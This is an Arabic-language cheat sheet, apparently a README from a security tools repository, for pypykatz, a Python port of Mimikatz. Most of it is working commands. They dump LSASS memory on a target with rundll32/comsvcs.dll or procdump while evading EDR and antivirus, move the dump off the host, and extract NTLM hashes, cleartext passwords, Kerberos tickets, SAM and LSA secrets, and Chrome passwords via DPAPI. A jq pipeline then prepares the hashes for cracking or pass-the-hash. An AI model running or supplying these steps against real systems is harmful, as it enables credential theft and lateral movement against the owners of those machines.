<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ورقة الغش pypykatz

[pypykatz](https://github.com/skelsec/pypykatz) هو تطبيق Python خالص لـ [Mimikatz](https://github.com/gentilkiwi/mimikatz). فهو يمكّن مختبري الاختراق والمستجيبين للحوادث من تحليل عمليات تفريغ ذاكرة Windows LSASS، وخلايا تسجيل SAM/SYSTEM/SECURITY، ومفاتيح DPAPI، وتذاكر Kerberos دون اتصال بالإنترنت تمامًا على Linux وmacOS دون تشغيل Windows Defender، أو وكلاء الكشف عن نقطة النهاية والاستجابة لها (EDR)، أو الحاجة إلى وصول مباشر لمضيف Windows.

---

## جدول المحتويات

- [نظرة عامة وأمن التشغيل (OpSec)](#overview--operational-security-opsec)
- [التثبيت](#التثبيت)
- [تحليل تفريغ LSASS دون اتصال (`lsa minidump`)](#offline-lsass-dump-parsing-lsa-minidump)
- [SAM واستخراج خلية النظام (`registry sam`)](#sam--system-hive-extraction-registry-sam)
- [استخراج أسرار LSA (`registry security`)](#lsa-secrets-extraction-registry-security)
- [مفاتيح DPAPI الرئيسية وتحليل بيانات الاعتماد](#dpapi-master-keys--credential-parsing)
- [تصدير JSON وخطوط أنابيب الاعتماد الآلية](#json-export--automated-credential-pipelines)
- [تقنيات تفريغ LSASS بأمان على نظام التشغيل Windows](#techniques-to-safely-dump-lsass-on-windows)

---

## نظرة عامة وأمن التشغيل (OpSec)

يؤدي تشغيل `mimikatz.exe` القياسي على جهاز يعمل بنظام Windows بشكل متكرر إلى تعطيل أجهزة الاستشعار السلوكية والتوقيعات الثابتة. يفصل `pypykatz` مرحلة الإغراق عن مرحلة التحليل:
1. قم بتفريغ ذاكرة عملية LSASS باستخدام أدوات LOLBAS الأصلية (Task Manager، أو `procdump`، أو `rundll32.exe`، أو `comsvcs.dll`).
2. قم بتصفية ملف `.dmp` إلى نظام تحليل Linux الخاص بك.
3. تحليل بيانات الاعتماد دون الاتصال بالإنترنت تمامًا باستخدام `pypykatz` مع عدم وجود خطر AV.

---

## تثبيت
```bash
# Recommended: Install via pipx
pipx install pypykatz

# Or via standard pip
python3 -m pip install --user pypykatz

# From source
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
pip install .

# Verify installation
pypykatz -h
```
---

## تحليل تفريغ LSASS دون اتصال (`lsa minidump`)

تحليل عمليات تفريغ الذاكرة التي تم إنشاؤها من `lsass.exe` لاسترداد كلمات مرور النص الواضح وتجزئة NTLM وتجزئة SHA1 وتذاكر Kerberos (TGT/TGS) ومفاتيح تشفير AES:

### 1. تحليل Minidump الأساسي
```bash
pypykatz lsa minidump /path/to/lsass.dmp
```
يستخرج الإخراج بيانات الاعتماد المقسمة بواسطة موفري الأمان:
- **msv1_0:** أسماء المستخدمين، والمجالات، وتجزئة NTLM، وتجزئة LM.
- **wdigest:** كلمات مرور Cleartext (إذا تم تمكين التخزين المؤقت لـ WDigest).
- **kerberos:** جلسات تذكرة Kerberos ومفاتيح AES.
- **ssp:** بيانات اعتماد موفر الدعم الأمني.
- **livessp:** بيانات اعتماد حساب Microsoft.
- **cloudap:** رموز التحديث الأساسية لـ Azure AD (PRT) ومفاتيح الجلسة.

### 2. تحليل تفريغ الذاكرة المتعددة بشكل متكرر
```bash
pypykatz lsa minidump /loot/dumps/ -r
```
---

## استخراج خلية سام آند سيستيم (`registry sam`)

قم باستخراج أسماء مستخدمي الحساب المحلي ومعرفات RID وتجزئة كلمة مرور NTLM من نسخ خلية تسجيل Windows غير المتصلة بالإنترنت:
```bash
pypykatz registry sam /loot/SYSTEM /loot/SAM
```
الإخراج:
```text
RID: 500
Username: Administrator
LM: None
NT: 31d6cfe0d16ae931b73c59d7e0c089c0
```
---

## استخراج أسرار LSA (`registry security`)

استرجع أسرار LSA، وكلمات مرور حساب الجهاز، وكلمات مرور المجال الافتراضية، ومفاتيح النص الواضح لحساب الخدمة من خلايا `SECURITY` و`SYSTEM`:
```bash
pypykatz registry security /loot/SYSTEM /loot/SECURITY
```
الأسرار المستخرجة تشمل:
- `_SC_DefaultPassword`: بيانات اعتماد تسجيل الدخول التلقائي.
- `$MACHINE.ACC`: تجزئات NTLM لحساب مجال الكمبيوتر.
- بيانات اعتماد المجال المخزنة مؤقتًا (DCC2 / mscache2).

---

## مفاتيح DPAPI الرئيسية وتحليل بيانات الاعتماد

تعمل واجهة برمجة تطبيقات حماية البيانات (DPAPI) على تشفير كلمات مرور Chrome ومفاتيح Wi-Fi وبيانات اعتماد RDP:

### 1. قم باستخراج مفاتيح DPAPI الرئيسية من السجل والنظام
```bash
pypykatz dpapi masterkey /loot/SYSTEM /loot/masterkey_file
```
### 2. فك تشفير كلمات المرور المخزنة في Chrome
```bash
pypykatz dpapi chrome --masterkey <MASTER_KEY_HEX> /loot/Login_Data
```
---

## تصدير JSON وخطوط أنابيب الاعتماد الآلية

قم بتصدير بيانات الاعتماد التي تم تحليلها مباشرةً إلى JSON لاستيعابها فورًا في Hashcat أو BloodHound أو CrackMapExec:
```bash
# Export minidump parsing to structured JSON
pypykatz lsa minidump lsass.dmp -k /tmp/loot_creds.json
```
استخرج تجزئات NTLM النظيفة باستخدام `jq` لتكسير التجزئة الفوري أو تمرير التجزئة:
```bash
jq -r '.logon_sessions[].msv_creds[] | "\(.username):\(.NT)"' /tmp/loot_creds.json | grep -v 'None' | sort -u > ntlm_hashes.txt
```
---

## تقنيات تفريغ LSASS بأمان على نظام التشغيل Windows

لتغذية الذاكرة في `pypykatz`، قم بإنشاء تفريغ LSASS مصغر على المضيف الهدف باستخدام المكونات الأصلية:

### 1. LOLBAS الأصلي عبر `comsvcs.dll` (Admin PowerShell)
```powershell
# Get LSASS process ID
$pid = (Get-Process lsass).Id

# Execute dump using native rundll32
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full
```
### 2. واجهة المستخدم الرسومية لإدارة المهام
1. افتح مدير المهام كمسؤول.
2. ضمن **التفاصيل**، انقر بزر الماوس الأيمن فوق `lsass.exe`.
3. انقر فوق **إنشاء ملف تفريغ** (تم حفظه في `%TEMP%\lsass.DMP`).

### 3.Sysinternals `procdump`
```cmd
procdump.exe -ma -accepteula lsass.exe C:\Temp\lsass.dmp
```
*بمجرد تنزيله على جهاز Linux الخاص بك، قم بتنفيذ `pypykatz lsa minidump lsass.dmp`.*